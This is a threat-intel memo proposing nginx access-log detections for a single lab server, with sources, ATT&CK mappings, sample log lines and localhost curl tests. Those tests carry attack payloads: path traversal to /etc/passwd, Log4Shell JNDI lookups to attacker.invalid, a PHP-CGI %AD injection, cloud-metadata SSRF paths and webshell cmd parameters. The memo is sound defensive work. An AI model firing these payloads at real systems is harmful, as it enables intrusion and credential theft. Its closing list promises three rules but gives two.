# nginx access-log detection ideas (single lab web server)

Prepared by Masha (Threat Intel), 2026-09-20. Research only: no rules written, nothing deployed.
Every claim below carries a source; where I could not verify something it says so.

## Read this first

**Telemetry assumed:** nginx access log only, Splunk `access_combined`. Usable fields: `clientip, method, uri, uri_path, uri_query, status, bytes, useragent, referer, req_time, user, cookie, version`. No request body, no POST parameters, no response body, no custom headers, no error log, no WAF, no TLS metadata.

**What that means in practice**
- The server logs the *request*, not the outcome of exploitation. Almost every item below works on a lab box with nothing vulnerable behind it: you fire the request at localhost, nginx answers 404/400 and writes the line, and the detection fires on the line. Only the "did it succeed?" tier of some items needs a 200, and for that you plant a harmless canary file yourself (noted per item).
- Localhost tests show `clientip` as `127.0.0.1` (or `::1`). Do not build an "ignore loopback" filter into the rule, or you will filter out your own test.
- nginx logs the request line as sent (percent-encoding is NOT decoded). Match both encoded and decoded forms, and expect `uri_path` / `uri_query` to contain the raw text.
- curl gotchas for testing: use `--path-as-is` or curl will collapse `/../` before sending; use `-g` (globoff) when the URL contains `{ } [ ]`; single-quote anything with `$` so the shell does not expand it. Prefer `curl` over PowerShell `Invoke-WebRequest`, which normalizes paths and rejects some characters. For raw junk use `printf '...' | nc localhost 80`.
- Placeholder hosts below use `.invalid` so nothing can resolve.

**Existing coverage in this repo:** none. `rules/sigma/` has no web/nginx rule, and no rule is tagged T1190, T1595.x, T1505.003 or T1083. Everything here is new ground for the library.

**Field-name warning (once, not solved here):** SigmaHQ web rules are written against the generic `webserver` field set (`cs-uri-query`, `cs-uri-stem`, `cs-method`, `sc-status`, `cs-user-agent`, `cs-referer`, `c-ip`; some rules use `c-uri`). Those do not match the Splunk names above (`uri_query`, `uri_path`, `method`, `status`, `useragent`, `referer`, `clientip`). You will be re-mapping any community rule you borrow from, or reading it purely for the indicator list.

**Grounding freshness key:** CURRENT = reported in the last ~12 months. STAPLE = old but still ubiquitous, stated as such.

## Ranked summary

| # | Detection | ATT&CK | Fields | Sigma-native? | Community rule exists? | Priority |
|---|---|---|---|---|---|---|
| 1 | Probing for secret / VCS / config files (`/.env*`, `/.git/`, `/.aws/credentials`, backups) | T1595.003, T1552.001 | uri_path, status, bytes | Yes | Partial (`.git/` only) | High |
| 2 | Path traversal / encoded dot-dot / OS-file references | T1190 | uri (path+query), status | Yes | Yes (weak) | High |
| 3 | Known scanner / attack-tool User-Agents | T1595.002 | useragent | Yes | Yes | High |
| 4 | Injection-payload strings in URI/UA/Referer (Log4Shell JNDI, template/OGNL) | T1190 | uri, useragent, referer | Yes | Yes | Med |
| 5 | Cloud-metadata / SSRF proxy-style paths | T1190, T1552.005 | uri_path, uri_query | Yes | No | Med |
| 6 | Scan burst: many distinct 404 paths from one client | T1595.003 | clientip, uri_path, status | No (SPL correlation) | Old/unsupported | Med |
| 7 | PHP-stack exploit paths (php-cgi `%AD`, phpunit `eval-stdin.php`, `/vendor/`) | T1190 | uri_path, uri_query | Yes | Only ET (network) | Med |
| 8 | Admin / debug / infra endpoint probing (phpMyAdmin, actuator, Ignition, wp-json batch, server-status) | T1595.002, T1190 | uri_path | Yes | No | Med |
| 9 | Webshell filenames and command-style parameters | T1505.003 (+ T1190) | uri_path, uri_query, status, bytes | Yes | Yes (Windows cmds) | Med |
| 10 | HTTP method / request-line anomalies (CONNECT, absolute-URI, TRACE, binary junk) | none clean (see note) | method, uri, status | Yes | No | Low |
| 11 | Login-endpoint brute force (burst of POSTs to `/wp-login.php`, `/login`) | T1110 (T1110.001/.003) | method, uri_path, clientip, status | No (SPL correlation) | Network-side only (ET) | Low |

Verified ATT&CK IDs (checked on attack.mitre.org): T1190 Exploit Public-Facing Application (Initial Access); T1595.002 Vulnerability Scanning and T1595.003 Wordlist Scanning (Reconnaissance); T1083 File and Directory Discovery; T1505.003 Web Shell (Persistence); T1552.001 Credentials In Files and T1552.005 Cloud Instance Metadata API (Credential Access); T1110 Brute Force with .001 Password Guessing / .003 Password Spraying.

---

## 1. Probing for secret, VCS and config files (High)

**Catches:** requests for `/.env`, `/.env.production`, `/.env.bak`, `/app/.env`, `/.git/config`, `/.git/HEAD`, `/.aws/credentials`, `/.ssh/id_rsa`, `/.DS_Store`, `wp-config.php.bak`, `backup.sql/.zip` and similar.

**ATT&CK:** T1595.003 (wordlist scanning) for the request itself; T1552.001 as the attacker's goal (CISA maps Androxgh0st's `.env` harvesting to T1552.001). The request only *attempts* it, so tag T1595.003 as primary.

**Grounding**
- CURRENT: GreyNoise, 2026-08-28, scanners forging AI-crawler user agents (GPTBot, ClaudeBot, Google-Extended and others) from 824 IPs between 2026-07-28 and 2026-08-23, requesting `/.env`, `/app/.env`, `/.env.production`, `/.aws/credentials`; they never requested `/robots.txt`. https://www.greynoise.io/blog/threat-actors-posing-as-ai-crawlers
- CURRENT: GreyNoise Labs, 2026-03-23, a scanning fleet with roughly 3.5M `.env` sessions, ~594K git-config sessions and ~173K AWS-credential sessions, 30+ `.env` path variants (numbers as stated on the page). https://www.labs.greynoise.io/grimoire/2026-03-23-bucklog-k8s/
- STAPLE: CISA advisory AA24-016A (Androxgh0st) lists `/.env`, `/.aws/credentials`, `/.git/config`, `/phpinfo.php` as harvest targets. https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a
- STAPLE: GreyNoise, 2025-04, spike of about 4,800 IPs/day crawling `.git/config`. https://www.greynoise.io/blog/spike-git-configuration-crawling-risk-codebase-exposure

**Signal fields:** `uri_path` (endswith / contains on a curated list); `status` and `bytes` for tiering.
Example (fabricated): `203.0.113.7 - - [20/Sep/2026:10:14:02 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; GPTBot/1.1)"`

**False positives:** almost none on a server that has no such files. Legit exceptions: a vulnerability scanner you run yourself; `/.well-known/` is a different path and must not match a naive `/.` pattern. Main lever: match a specific path list, not "any dotfile".

**Testability:** trivially safe on one VM. `curl -s -o /dev/null http://localhost/.env` (404), `.../.git/config`, `.../.aws/credentials`. **Two-tier idea:** create a dummy `/var/www/html/.env` containing only `TEST=1`; the same request then returns 200 with `bytes>0`, which is the "exposed and retrievable" high-severity variant, and you can verify the rule distinguishes the tiers. Native Sigma.

**Community rule:** SigmaHQ `web_source_code_enumeration.yml` only keys on `.git/` (tagged T1083): https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_source_code_enumeration.yml . A `gh` code search of the SigmaHQ repo on 2026-09-20 found no `.env` / `.aws` web rule (search can be incomplete). You would be writing most of this fresh.

**Priority High:** the most heavily and recently observed web activity I found, near-zero FP, a one-line test.

---

## 2. Path traversal / encoded dot-dot / OS-file references (High)

**Catches:** `../` and its encodings (`%2e%2e%2f`, `..%2f`, `%252e%252e%252f`, `.%2e/`, overlong `%c0%af`) and direct references such as `/etc/passwd`, `/proc/self/environ`, `/windows/win.ini` in the path or query.

**ATT&CK:** T1190.

**Grounding**
- STAPLE, still tracked: CVE-2021-41773 and CVE-2021-42013 (Apache HTTP Server path traversal) are in CISA KEV, both added 2021-11-03. Signature is `/cgi-bin/.%2e/.%2e/...` and `/icons/.%2e/`. (Checked in the CISA KEV JSON feed, catalog version 2026.09.18.)
- CURRENT: KEV keeps adding path-traversal entries: CVE-2026-85706 GitLab (added 2026-09-11, unauthenticated arbitrary file read), CVE-2026-59310 VMware vCenter (2026-08-18), CVE-2024-27199 TeamCity and CVE-2025-2749 Kentico (2026-04-20). https://www.cisa.gov/news-events/alerts/2026/09/11/cisa-adds-one-known-exploited-vulnerability-catalog and https://www.cisa.gov/news-events/alerts/2026/08/18/cisa-adds-four-known-exploited-vulnerabilities-catalog . I did NOT confirm the exact request signature of those newer CVEs, so they justify the class, not specific strings.
- Note: I saw a search-result claim of "June 2026 coordinated Apache 41773 + phpunit chains in about 65 seconds" from a blog summary; I could not verify it against the primary page, so it is not relied on.

**Signal fields:** `uri` (or both `uri_path` and `uri_query`), `status`.
Example (fabricated): `203.0.113.9 - - [20/Sep/2026:10:20:11 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 400 150 "-" "curl/8.5.0"`

**False positives:** low. Some apps legitimately carry relative paths in a query (download/file parameters), and internal vuln scanners trip it. Lever: require 3+ traversal segments or a sensitive target file; add a status filter if you want "worked" (2xx/3xx) vs "attempted".

**Testability:** safe. `curl --path-as-is 'http://localhost/cgi-bin/.%2e/.%2e/etc/passwd'` and `curl --path-as-is 'http://localhost/../../../etc/passwd'`. nginx will answer 400 or 404 depending on normalization (I have not verified which on Ubuntu 24.04's build; check), and writes a log line either way. Native Sigma. The "succeeded" tier (200) only makes sense with a vulnerable app and is not testable here; test the "attempted" tier.

**Community rules:** SigmaHQ `web_path_traversal_exploitation_attempt.yml` (keys on `cs-uri-query` only, and a short list of patterns, so it would miss traversal placed in the path, which is where nginx puts it): https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml ; CVE-specific: https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml ; ET `sid:2034124/2034125/2034128` (Apache 2.4.49 traversal, network-side). Re-deriving a broader, path-aware version is worthwhile.

**Priority High:** the most durable web technique, easy to test, and the community rule has a real gap you can fill.

---

## 3. Known scanner / attack-tool User-Agents (High)

**Catches:** default UAs of recon and exploit tooling: `sqlmap/`, `Nikto/`, `Nmap Scripting Engine`, `zgrab`, `gobuster/`, `feroxbuster/`, `Fuzz Faster U Fool`, `WPScan`, `Wfuzz`, plus specific current ones: `libredtail-http` (RedTail cryptominer campaign) and `wp2shell`.

**ATT&CK:** T1595.002 (vulnerability scanning) fits the scanner set. Sigma tags several of these T1190; T1595.002 is more accurate for pure scanning UAs, T1190 for `libredtail-http`/`wp2shell` which are exploit tools.

**Grounding**
- CURRENT: `libredtail-http` UA tied to RedTail miner delivery via CVE-2024-4577, SANS ISC diary 2026-04-29. https://isc.sans.edu/diary/Danger+of+Libredtail+Guest+Diary/32936/ (Sigma rule dated 2026-04-30, status experimental.)
- CURRENT: `wp2shell` PoC UA for WordPress core RCE CVE-2026-63030 / CVE-2026-60137, both in CISA KEV as of 2026-07-21 (KEV feed). Research disclosure 2026-07-17: https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/ . The disclosure page did not state in-the-wild exploitation; KEV listing does.
- STAPLE: ET `sid:2002677` (Nikto), `2008538` (sqlmap), `2009358/2009359` (Nmap NSE), `2029054` (Zmap inbound). https://rules.emergingthreats.net/open/suricata-5.0/rules/emerging-scan.rules
- Caution (GreyNoise, same Bucklog page): the busiest fleet used plain `curl/8.7.1` (reported as 91.5% of sessions) and spoofed a Chrome UA. UA-only detection catches lazy and default-config tools, not the disciplined ones. And the August 2026 fake-AI-crawler traffic copied legitimate UA strings character for character, so UA alone cannot separate real crawlers from fakes there (GreyNoise's answer was IP-range verification).

**Signal field:** `useragent` (contains, case-insensitive).
Example (fabricated): `198.51.100.4 - - [20/Sep/2026:11:02:40 +0000] "GET /admin HTTP/1.1" 404 134 "-" "sqlmap/1.8#stable (https://sqlmap.org)"`

**False positives:** your own authorized scans; security-research crawlers. Do NOT put bare `curl` or `python-requests` in the list (legit monitoring). Lever: keep a curated list; split high-signal (exploit tools) from medium-signal (scanners) if you want two severities.

**Testability:** `curl -A 'sqlmap/1.8' http://localhost/`, `curl -A 'libredtail-http' http://localhost/`. Fully safe, native Sigma.

**Community rules:** SigmaHQ `web_susp_useragents.yml` https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_susp_useragents.yml ; RedTail https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2026/Malware/RedTail-Cryptominer/web_malware_redtail_useragent.yml ; wp2shell https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2026/Exploits/CVE-2026-63030/web_exploit_cve_2026_63030_wp2shell_tool_useragent.yml ; Splunk Security Content `http_scripting_tool_user_agent.yml` (found by filename, contents not reviewed): https://github.com/splunk/security_content/tree/develop/detections/web . Largely a re-derivation, but it is the simplest possible first rule.

**Priority High:** best "first rule" for testing the whole nginx-to-Splunk path; moderate real-world value because UAs are trivially spoofed.

---

## 4. Injection-payload strings in URI, User-Agent and Referer (Med)

**Catches:** Log4Shell `${jndi:ldap://...}` (and obfuscations such as `${${lower:j}ndi:`), template/OGNL probes (`{{7*7}}`, `${7*7}`, `%24%7B`), Shellshock-style `() { :;};`.

**ATT&CK:** T1190.

**Grounding**
- STAPLE, still sprayed: CVE-2021-44228 Log4j is in CISA KEV (added 2021-12-10); CVE-2014-6271 Bash "Shellshock" (added 2022-01-28); CVE-2022-26134 and CVE-2021-26084 Confluence OGNL injection (KEV). (KEV feed.) I did not find a 2026 report specifically on Log4Shell volume, so treat it as a staple, not a trend.
- ET has a large family, for example `sid:2034647` (http ldap), `2034655` (http dns), `2045126` (http inbound). https://rules.emergingthreats.net/open/suricata-5.0/rules/emerging-exploit.rules

**Signal fields:** `uri`, `useragent`, `referer` (search the whole event). Real Log4Shell spraying targets many headers; you only see UA, Referer and the URL, so this is a partial view. Say that in the rule's description.
Example (fabricated): `203.0.113.20 - - [20/Sep/2026:11:31:09 +0000] "GET /?x=%24%7Bjndi:ldap://attacker.invalid/a%7D HTTP/1.1" 404 134 "-" "${jndi:ldap://attacker.invalid/a}"`

**False positives:** security scanners you own (Nessus is filtered in the Sigma rule), and legitimate `${` in a query from some templating apps. Lever: anchor on `jndi:`, `${::-`, `${lower:` rather than a bare `${`.

**Testability:** `curl -g -A '${jndi:ldap://attacker.invalid/a}' http://localhost/` and `curl -g 'http://localhost/?x=$%7Bjndi:ldap://attacker.invalid/a%7D'`. `.invalid` cannot resolve, so nothing leaves the box even if something parsed it. Native Sigma (keyword-style search).

**Community rules:** https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml (extensive obfuscation list); https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_jndi_exploit.yml ; https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_ssti_in_access_logs.yml ; Splunk `log4shell_jndi_payload_injection_attempt.yml` (by filename). Mostly re-derivation; value is in learning the encoding variants.

**Priority Med:** low FP and easy to test, but the technique is old and on a static server it tells you "someone sprayed you", not "someone got in".

---

## 5. Cloud-metadata / SSRF proxy-style paths (Med)

**Catches:** requests trying to make the server fetch its own cloud metadata: `/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/`, `?url=http://169.254.169.254/...`, IPv6-mapped and decimal-integer variants (`/proxy/2852039166/...`, `/proxy/[::ffff:a9fe:a9fe]/...`).

**ATT&CK:** T1190 (delivery via SSRF) and T1552.005 (Cloud Instance Metadata API, Credential Access; MITRE explicitly lists SSRF as a route).

**Grounding**
- CURRENT: SANS ISC diary 2026-03-16, "/proxy/ URL scans with IP addresses", documents exactly these encodings aimed at 169.254.169.254 to defeat filters and IMDSv2. https://isc.sans.edu/diary/32800

**Signal fields:** `uri_path` / `uri_query` containing `169.254.169.254`, `latest/meta-data`, `security-credentials`, the encoded/decimal forms.
Example (fabricated): `192.0.2.50 - - [20/Sep/2026:12:05:33 +0000] "GET /proxy/169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 404 134 "-" "Mozilla/5.0"`

**False positives:** very low outside AWS-aware tooling; an app that legitimately proxies to metadata would be unusual. Lever: none needed initially.

**Testability:** `curl http://localhost/proxy/169.254.169.254/latest/meta-data/` and the decimal variant. Safe, native Sigma. Request is only logged; nothing fetches anything.

**Community rule:** none found in SigmaHQ webserver rules (search of the repo tree on 2026-09-20; may be incomplete). Fresh write.

**Priority Med:** current, distinctive and near-zero FP, but narrow (one attack pattern) and you will not see hits on a non-cloud lab.

---

## 6. Scan burst: many distinct 404 paths from one client (Med, needs SPL)

**Catches:** one `clientip` requesting many *different* non-existent paths in a short window, the shape of directory brute-forcers and mass scanners (wordlist scanning).

**ATT&CK:** T1595.003.

**Grounding**
- Community precedent: SigmaHQ (unsupported) `web_multiple_susp_resp_codes_single_source.yml`, `count() by clientip > 10` in 10 minutes over 400/401/403/500. https://github.com/SigmaHQ/sigma/blob/master/unsupported/web/web_multiple_susp_resp_codes_single_source.yml
- Behavior grounded by the scanning fleets in item 1 (millions of path probes per fleet) and ET scanner signatures (item 3). Wordlist scanning is described at https://attack.mitre.org/techniques/T1595/003/ . STAPLE.

**Signal fields:** `clientip`, `status`, distinct count of `uri_path`, time window.
Logic shape (description only): status 404 (optionally 400/403), grouped by `clientip` per N minutes, alert when distinct `uri_path` count exceeds a threshold. Counting *distinct* paths, not requests, avoids tripping on one broken asset being retried.

**False positives:** a broken page that requests many missing assets; a link checker; your own monitoring. Lever: distinct-path threshold and window, and an allow-list for the monitoring host.

**Testability on one VM, and low traffic:** this is easy to test precisely because the baseline is dozens of events a week: any threshold of, say, 15 distinct 404s in 5 minutes is far above normal, so you can set it without tuning theatre. Test: `for i in $(seq 1 30); do curl -s -o /dev/null "http://localhost/p$i.php"; done` (a burst of 30 distinct 404s from 127.0.0.1). The caveat is the reverse: on a busier server the threshold would need real tuning, which you cannot demonstrate here. **Needs raw SPL / correlation**, not native Sigma (Sigma's newer correlation rules or `custom.splunk.raw_query` are the routes; that decision is yours).

**Priority Med:** the best single behavioral signal for "someone is mapping this server", and a good test of correlation, but it costs a raw-SPL rule.

---

## 7. PHP-stack exploit paths: php-cgi `%AD`, phpunit `eval-stdin.php`, `/vendor/` (Med)

**Catches:** (a) CVE-2024-4577 PHP-CGI argument injection: a soft-hyphen `%AD` before option letters in the query string (`?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input`) against `/php-cgi/php-cgi.exe` or a `.php` URL; (b) `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` (CVE-2017-9841); (c) generic `/vendor/` and composer-artifact probing.

**ATT&CK:** T1190.

**Grounding**
- CURRENT: `libredtail-http` / RedTail delivered via CVE-2024-4577 with PHP install-path probing and `<?php echo(md5("Hello PHPUnit"));` checks, SANS ISC 2026-04-29 (https://isc.sans.edu/diary/Danger+of+Libredtail+Guest+Diary/32936/). CVE-2024-4577 is in KEV (added 2024-06-12). GreyNoise reported 1,089 unique IPs exploiting it in January 2025 alone (https://www.greynoise.io/blog/mass-exploitation-critical-php-cgi-vulnerability-cve-2024-4577).
- STAPLE: CVE-2017-9841 PHPUnit is in KEV (added 2022-02-15); Androxgh0st hits `eval-stdin.php` per CISA AA24-016A (https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a).
- KEV describes CVE-2024-4577 as affecting Windows-based PHP in CGI mode; your Ubuntu box is not the target platform, so this is "attempt" telemetry only.

**Signal fields:** `uri_path` (endswith `eval-stdin.php`, contains `php-cgi`), `uri_query` (starts with `%AD` / contains `%ADd`). The POST body (the actual PHP code) is invisible; the URL alone is enough for the attempt.
Example (fabricated): `203.0.113.31 - - [20/Sep/2026:12:40:18 +0000] "POST /php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 404 134 "-" "libredtail-http"`

**False positives:** almost none for the `%AD` pattern and `eval-stdin.php` (that file should never be web-reachable). Generic `/vendor/` is broader; lever: only alert on the specific paths.

**Testability:** `curl 'http://localhost/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1'` and `curl http://localhost/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`. Safe (no PHP on the box, request just 404s). Native Sigma.

**Community rules:** none found for these in SigmaHQ web rules; ET covers 41773-style traversal but I did not find a php-cgi or eval-stdin web rule in the ET files I searched (emerging-web_server, web_specific_apps, exploit, scan). Largely fresh.

**Priority Med:** actively exploited now (RedTail 2026), distinctive and near-zero FP; discounted because on this Linux nginx it is attempt-only.

---

## 8. Admin, debug and infra endpoint probing (Med)

**Catches:** requests to known-exploited or high-value endpoints: `/phpmyadmin/`, `/manager/html` (Tomcat), `/actuator/env` and `/actuator/heapdump` (Spring Boot), `/_ignition/execute-solution` (Laravel), `/server-status`, `/HNAP1/`, `/remote/fgt_lang` (Fortinet), `/wp-login.php`, `/xmlrpc.php`, and the current WordPress REST batch route `/wp-json/batch/v1` or `?rest_route=/batch/v1`.

**ATT&CK:** T1595.002 for the probe; T1190 where the path is an actual exploit route (Ignition, actuator heapdump, batch route).

**Grounding**
- CURRENT: WordPress core RCE CVE-2026-63030 / CVE-2026-60137 (KEV 2026-07-21); the disclosure names `/wp-json/batch/v1` and `?rest_route=/batch/v1` as the route to block (https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/). Caveat: legitimate WordPress (block editor) also uses REST batch, so on a real WP site this path alone is noisy; on your no-WordPress lab server any hit is anomalous.
- CURRENT: GreyNoise "At The Edge Clear", 2026-06-15 to 23, reports Laravel and TeleMessage credential harvesting (https://www.greynoise.io/resources/at-the-edge-clear-062226); CVE-2025-48927 TeleMessage is in KEV (2025-07-01) and relies on an exposed Spring Boot Actuator heap dump; CVE-2021-3129 Laravel Ignition is in KEV (2023-09-18). Sources checked in the KEV feed.
- STAPLE: the bait list in the open-source `nginx-honeypot` (`.env`, `/wp-includes/`, phpMyAdmin, `/actuator/health`, `/HNAP1`, `/remote/fgt_lang`, Exchange paths) is a practical, bot-derived wordlist (https://github.com/dvershinin/nginx-honeypot).

**Signal field:** `uri_path` against a curated list.
Example (fabricated): `198.51.100.77 - - [20/Sep/2026:13:00:05 +0000] "GET /actuator/heapdump HTTP/1.1" 404 134 "-" "Mozilla/5.0"`

**False positives:** low on a server that does not host these apps; the moment you host one of them, its own admins hit the path. Lever: keep the list tied to apps you do NOT run, and treat status 200 as escalation.

**Testability:** one curl per path (`curl http://localhost/phpmyadmin/`, `curl http://localhost/actuator/heapdump`); all 404, all logged. Native Sigma.

**Community rule:** no equivalent in SigmaHQ `webserver_generic` (repo tree checked 2026-09-20); ET has app-specific ones (for example `sid:2014020` WordPress login bruteforcing, `2015737` phpMyAdmin backdoor). Fresh write.

**Priority Med:** high-volume real activity and cheap to test, but it overlaps items 1 and 6, so it is better as a second-wave rule.

---

## 9. Webshell filenames and command-style parameters (Med)

**Catches:** (a) requests to well-known webshell filenames (`c99.php`, `r57.php`, `wso.php`, `shell.php`, `cmd.aspx`, `/wp-content/plugins/wp2shell_*`); (b) GET requests with command-like parameters (`?cmd=whoami`, `?c=id`, `=net+user`). This is the *post-compromise* half of the web story.

**ATT&CK:** T1505.003 (Web Shell) for the real thing. A probe for a shell filename on a clean server is really recon/T1190; only a 200 on a file you never deployed is evidence of a shell.

**Grounding**
- STAPLE: filename list c99/r57/WSO/by.php/shell.php and the "200 on a script that was never part of the application" heuristic are from general webshell-detection write-ups (for example https://www.huntress.com/threat-library/malware/php-webshell); I did not find a single authoritative vendor filename list, so treat filenames as heuristics.
- CURRENT: Sigma `web_exploit_cve_2026_63030_webshell_plugin_access.yml` targets `/wp-content/plugins/wp2shell_` post-exploitation access. CISA AA24-016A: Androxgh0st deploys webshells (T1505.003) after `eval-stdin.php` RCE.

**Signal fields:** `uri_path`, `uri_query`, `status`, `bytes`; `method` (webshells are frequently driven by POST, the parameters of which you cannot see).
Example (fabricated): `203.0.113.88 - - [20/Sep/2026:13:22:47 +0000] "GET /uploads/x.php?cmd=whoami HTTP/1.1" 200 12 "-" "Mozilla/5.0"`

**False positives:** wikis and docs pages that mention shell commands in URLs (the Sigma rule itself warns of this); the `?cmd=` parameter name is used by some legit apps. Lever: require both command string and 200, and exclude paths of apps you know.

**Testability:** for the attempt tier, `curl 'http://localhost/c99.php?cmd=whoami'` (404). For the "shell answered" tier, place an inert `/var/www/html/x.php` (static text, no PHP is executed by nginx) and request it with the parameter, giving a 200 with a small `bytes`. Native Sigma.

**Community rules:** https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml (Windows command strings, GET only, `=whoami`, `=net user`, `=cmd /c`...), ReGeorg https://github.com/SigmaHQ/sigma/blob/master/rules/web/webserver_generic/web_webshell_regeorg.yml ; ET generic webshell `sid:2030911/2030941/2032741`. The Sigma rule is Windows-flavored; a Linux-command variant (`=id`, `=uname`, `=cat+/etc`) would be new.

**Priority Med:** the tier that indicates real compromise, but only meaningful if you also model the 200 case; the probing tier is weak evidence.

---

## 10. HTTP method / request-line anomalies (Low)

**Catches:** `CONNECT` requests, absolute-URI GETs (`GET http://other.invalid/ HTTP/1.1`, open-proxy testing), `TRACE`/`TRACK`, `PROPFIND` and other WebDAV methods against a server that serves none, and junk request lines (binary/TLS-handshake bytes sent to a plain-HTTP port, which nginx logs as 400 with an unparseable request).

**ATT&CK:** no clean match. T1595.002 is the closest for pure probing; open-proxy abuse maps loosely to T1090 (Proxy), but that is attacker infrastructure use, not what the log line shows. Say the fit is weak rather than force a tag.

**Grounding:** SANS ISC documents open-proxy hunting with CONNECT and absolute-URI GET (for example https://isc.sans.edu/diary/rss/29246 and the 2026-03-16 diary in item 5); I did not extract current volumes, so this is qualitative. STAPLE.

**Signal fields:** `method`, `uri` (starts with `http://` or `https://`), `status` (400/405/501).
Example (fabricated): `192.0.2.61 - - [20/Sep/2026:14:01:12 +0000] "CONNECT example.invalid:443 HTTP/1.1" 400 150 "-" "-"`

**False positives:** CONNECT/absolute-URI: essentially none on a non-proxy web server. TRACE/PROPFIND: some uptime and DAV clients. Junk lines: benign port scanners and health probes. Lever: alert on CONNECT and absolute-URI only.

**Testability:** `curl -X CONNECT http://localhost/`, `curl -X TRACE http://localhost/`, `curl --request-target 'http://other.invalid/x' http://localhost/`, `printf '\x16\x03\x01\x02\x00' | nc localhost 80`. Safe. Native Sigma for the method and URI cases; the junk-line case depends on whether the Splunk extraction populates fields for an unparseable request (check before relying on it).

**Community rule:** none found for this in SigmaHQ webserver rules. Fresh write.

**Priority Low:** a neat proxy-probe signal, but weak ATT&CK fit and low real-world impact on a server that is not a proxy.

---

## 11. Login-endpoint brute force (Low, needs SPL)

**Catches:** many POSTs from one `clientip` to a login-like path (`/wp-login.php`, `/login`, `/admin/login`, `/user/login`) in a short window.

**ATT&CK:** T1110 with .001 (single-account guessing) or .003 (spraying); the access log cannot tell which, because the usernames are in the POST body. Tag T1110 and pick a sub-technique only if you can justify it.

**Grounding:** STAPLE: WordPress login and XML-RPC brute-forcing is documented in WordPress's own handbook (https://developer.wordpress.org/advanced-administration/security/brute-force/); ET `sid:2014020` "Wordpress Login Bruteforcing Detected" (https://rules.emergingthreats.net/open/suricata-5.0/rules/emerging-web_server.rules). I did not find a current-dated CTI report I could verify, so this is a staple, not a trend.

**Signal fields:** `method=POST`, `uri_path`, `clientip`, `status`, count in window. The response code can hint at failure vs success on some apps, but that is app-specific and not testable here.

**False positives:** a real user who mistypes; SSO redirect loops; monitoring that logs in every minute. Lever: threshold per window, and an allow-list.

**Testability:** `for i in $(seq 1 20); do curl -s -o /dev/null -X POST http://localhost/wp-login.php; done` (404 on a server without WordPress; that is fine, the rule keys on the attempt pattern). **Needs raw SPL / correlation.** With no login form on the lab server, this only tests the counting, not a realistic scenario.

**Community rule:** none in SigmaHQ web rules; ET's is network-side. Fresh write, but see the limitation below.

**Priority Low:** the login app is not there, the credentials and outcome are invisible, and `xmlrpc.php` `system.multicall` packs hundreds of guesses into one request so a request count undercounts it (that packing is documented in general WordPress-security write-ups; not verified against a primary source).

---

## Not ranked on purpose

- **SQLi and XSS strings in GET URLs.** Community rules already exist (`web_sql_injection_in_access_logs.yml`, `web_xss_in_access_logs.yml`, both drop 404s), and on a static server they add little beyond items 3 and 6. Only GET-borne payloads are visible at all.

## Explicitly NOT detectable with access logs alone

| Attack | Why not | Extra telemetry needed |
|---|---|---|
| React2Shell (CVE-2025-55182, in KEV 2025-12-05) and most RSC/Next.js, JSON-API, deserialization RCE | Payload is a crafted POST body (multipart/form-data per public write-ups); the log shows only `POST /` and a status | Request-body logging, or a WAF audit log (for example ModSecurity) |
| SQLi / XSS / command injection sent via POST or JSON | Parameters live in the body | Body logging or WAF audit log |
| Androxgh0st `eval-stdin.php` code, RedTail install scripts | The PHP/shell payload is in the POST body; only the URL is seen (item 7 catches the attempt, not the content) | Body logging, EDR/auditd on the host |
| Whether an exploit actually worked | Access log has only status and byte count, no response body | Response logging (rarely enabled), app logs, host EDR |
| Webshell *upload* and file drop | Multipart body, and the write happens on disk | File-integrity monitoring or auditd file-create events |
| Log4Shell in arbitrary headers (`X-Forwarded-For`, `X-Api-Version`, custom) | Only UA and Referer are logged | `log_format` extended with `$http_*` fields, or WAF |
| HTTP request smuggling, Host-header and cache-poisoning attacks | Depend on raw headers (Transfer-Encoding, duplicate Content-Length) | Header logging, WAF, or a reverse proxy in front |
| XML-RPC `system.multicall` credential stuffing | Many guesses in one request body (item 11) | Application auth log, body logging |
| Server crashes, upstream failures, config errors, module errors | Live in the error log, not the access log | nginx `error.log` ingestion |
| TLS-layer scanning and JA3/JA4 client fingerprinting | No TLS metadata in the access log (the GreyNoise fake-crawler campaign was fingerprinted this way) | TLS/Suricata logging, `$ssl_*` variables |
| Slow-request DoS (Slowloris) | `req_time` only shows it after the request finishes, if you log it at all | `$request_time` plus connection metrics, or network logs |
| IP-reputation and crawler-impersonation checks | Needs an external list of real crawler ranges | Threat-intel/IP-range lookup table in Splunk |

## Suggested first three rules to write

1. **Item 1, secret/VCS/config file probing (with the 200-tier).** Highest and most recent real-world volume, near-zero FP, a one-line test on localhost, and the community coverage gap is real. The optional canary file also teaches you to write a severity tiering on `status`.
2. **Item 2, path traversal / encoded dot-dot.** Durable technique, easy test with `--path-as-is`, and the existing SigmaHQ rule only inspects `cs-uri-query`, so a path-aware version is new work rather than a copy.
